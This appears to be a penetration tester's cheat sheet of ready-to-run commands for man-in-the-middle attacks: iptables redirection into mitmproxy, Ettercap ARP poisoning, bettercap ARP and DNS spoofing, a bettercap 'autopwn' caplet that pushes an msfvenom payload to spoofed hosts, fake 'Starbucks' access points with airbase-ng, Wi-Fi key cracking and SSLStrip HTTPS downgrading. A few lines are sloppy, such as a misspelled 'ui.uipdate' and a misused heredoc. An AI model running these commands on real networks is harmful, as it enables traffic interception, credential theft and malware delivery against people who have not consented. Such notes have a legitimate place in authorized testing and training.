# Man-In-The-Middle Attacks
======

## mitmproxy
------
#### Enable IPv4 Forwarding
sysctl -w net.inet.ip.forwarding=1
#### Something Something iptables
iptables -t nat -A POSTROUTING -i eth0 -j MASQUERADE
#### Redirect 443 Traffic to mitmproxy (8080)
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
#### Redirect 80 Traffic to mitmproxy (8080)
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#### Run MiTMProxy
mitmproxy -T --host -e

## Ettercap
------
#### Text only in GUI
 -T
#### General Format
ettercap -T -q -M METHOD:ARGS ba:ad:f0:0d:aa:aa/10.1.1.1// /10.1.1.2-6//
#### MitM two IPs via ARP Poisoning
ettercap -TqM arp:remote /10.0.0.1// /10.0.0.42//
#### Convert an Ettercap Filter to ef format
etterfilter -o smb.ef smb.filter
#### MitM two IPs via ARP Poisoning and apply an Ettercap Filter
ettercap -TqM arp:remote -F smb.ef /10.0.0.1// /10.0.0.42//
#### Sleep
s(13)

## bettercap
------
#### Updates Caplets (only run once)
sudo bettercap --eval "caplets.update; ui.uipdate;q"
#### Run HTTP-UI Caplet
sudo bettercap --caplet http[s]-ui
#### Get Help on an Option
help net.recon
#### Read ARP periodically for new hosts
net.recon {on,off}
#### Do recon for 30s then stop
net.recon on; sleep 30; net.recon off
#### Perform Active Scanning sending UDP packets (NBNS, MDNS, UPNP, WSD)
net.probe {on,off}
#### Collect information about active recon hosts
net.sniff {on,off,status}
#### Send output of collected info to file
set  net.sniff.output file.txt
#### Fuzz network protocols
net.fuzz {on,off}
#### Choose which layers to manipulate
set net.fuzz.layers layers
#### Run a command at a set frequency
ticker {on,off}; set ticker.commands list <semicolon> of <semicolon> commands <semicolon>; set ticker.period 60;
#### Show Network
net.show
#### Clear Screen
clear
#### Cool Caplet View
```

cat foo.cap <<EOF
set ticker.commands 'clear; net.show; events.show 10'
net.probe ON
ticker ON
EOF
```
#### Run Caplet
bettercap --caplet /path/to/foo.cap
#### Unk.
bettercap --caplet foo (.:./caplets/:$CAPSPATH:/usr/local/share/bettercap/caplets/)
#### Show Caplets
caplets.show
#### Update Caplets
caplets.update
#### Autopwn Caplet with Bettercap
(generate msfvenom payload placed into caplets directory /usr/local/share/bettercap/caplets/download-autopwn/windows/payload.exe); bettercap -caplet /usr/local/share/bettercap/caplets/download-autopwn.cap -eval 'events.ignore endpoint; set arp.spoof.targets <ip>; arp.spoof.on'
#### Ignore certain endpoints
events.ignore endpoint
#### Update Bettercap
update.check on 
#### Get More Help!
get http.*
#### Show Active Modules
active
#### Quit
q
#### Get Help
help MODULE_NAME
#### Use Caplet
include CAPLET
#### Alias
alias MAC NAME
#### Probe On
net.probe on
#### Set ARP Spoofing Targets
set arp.spoof.targets <ip-addrs>
#### Turn on Parameter
arp.spoof on
#### Set Sniffing Verbose
set net.sniff.verbose true
#### Sniff Network Traffic
net.sniff on
#### Parse SNI, Hostnames, and URLs
net.sniff module
#### DNS Spoofing
dns.spoof {on,off}; set dns.spoof.address 10.1.1.0; set dns.spoof.domains domain; set dns.spoof.all {true,false}; set dns.spoof.hosts hostsfile;

## AirDump
------
#### AirCrack-NG
aircrack-ng traffic.pcap -r /path/to/wordlist.txt
#### AirBase-NG
airbase-ng --essid Starbucks -c 1 -a AA:AA:AA:AA:AA:AA -W 1 mon0
#### AirBase-NG
airbase-ng --essid Starbucks -c 1 -a AA:AA:AA:AA:AA:AA -W 1 mon1
#### AirBase-NG
airbase-ng --essid Starbucks -c 1 -a AA:AA:AA:AA:AA:AA -W 1 mon2
#### AirBase-NG
airbase-ng -a aa:aa:aa:aa:aa:aa -c 1 -Z 4 mon0 --essid NoAP
#### Create SSL Certificate with LetsEncrypt
<a href="https://certbot.eff.org/lets-encrypt/ubuntubionic-apache">https://certbot.eff.org/lets-encrypt/ubuntubionic-apache</a>

## MitMdump
------
#### Transparent mitm proxy
mitmdump --mode transparent -s sslstrip.py

## SSLStrip
------
#### Turn on IP forwarding to allow forward of packets
echo "1" > /proc/sys/net/ipv4/ip_forward
#### Redirect all HTTP (TCP/80) traffic to the SSLStrip process listening on port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
#### Start SSLSTrip on TCP/8080
sslstrip -l 8080